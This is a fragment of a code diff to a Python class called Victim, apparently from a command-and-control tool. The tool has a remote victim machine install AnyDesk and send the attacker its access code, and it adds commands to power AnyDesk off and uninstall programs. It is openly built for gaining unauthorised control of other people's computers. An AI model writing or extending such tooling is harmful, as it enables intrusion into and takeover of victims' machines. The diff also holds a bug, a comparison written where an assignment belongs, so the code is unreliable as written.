@@ -61,7 +61,9 @@ class Victim:
             raise ThereIsAlreadyOneRunningCommand()
         self._lockCommands()
 
+        self._unlockCommands()
         self._installAnydesk()
+        self._lockCommands()
 
         print(
             f"{self.getAddr()}: Waiting for the victim to install anydesk and send us the code!")
@@ -173,7 +175,7 @@ class Victim:
         code = None
 
         if command == INSTALL_ANYDESK_COMMAND:
-            code = INSTALL_ANYDESK_COMMAND_CODE
+            code = INSTALL_ANYDESK_CODE
 
         elif command == GET_CODE_COMMAND:
             code = GET_CODE_COMMAND_CODE
@@ -183,6 +185,9 @@ class Victim:
 
         elif command == POWER_OFF_ANYDESK_COMMAND:
             code = POWER_OFF_ANYDESK_CODE
+
+        elif command == UNINSTALL_PROGRAM_COMMAND:
+            code == UNINSTALL_PROGRAM_CODE
 
         else:
             raise ValueError("Invalid command!")
